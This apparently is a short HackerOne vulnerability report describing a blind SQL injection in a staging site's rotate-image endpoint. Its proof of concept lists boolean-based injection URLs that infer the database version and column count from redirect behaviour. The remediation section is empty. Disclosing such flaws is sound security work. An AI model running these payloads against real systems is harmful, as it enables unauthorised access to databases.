# HackerOne Report: SQL Injection
**Report ID:** 23014
**Vulnerability Class:** SQL Injection

## Vulnerability Information & PoC
https://staging.uzbey.com/rotate-image?fid=2841+and+substring(version(),1,1)=4 FALSE
https://staging.uzbey.com/rotate-image?fid=2841+and+substring(version(),1,1)=5 TRUE

https://staging.uzbey.com/rotate-image?fid=2841+and+1=1+order+by+1-- TRUE
https://staging.uzbey.com/rotate-image?fid=2841+and+1=1+order+by+2-- FALSE

FALSE = will redirect to access denied
TRUE = redirected to page not found

fid must be a valid image id



## Discussion & Remediation Timeline
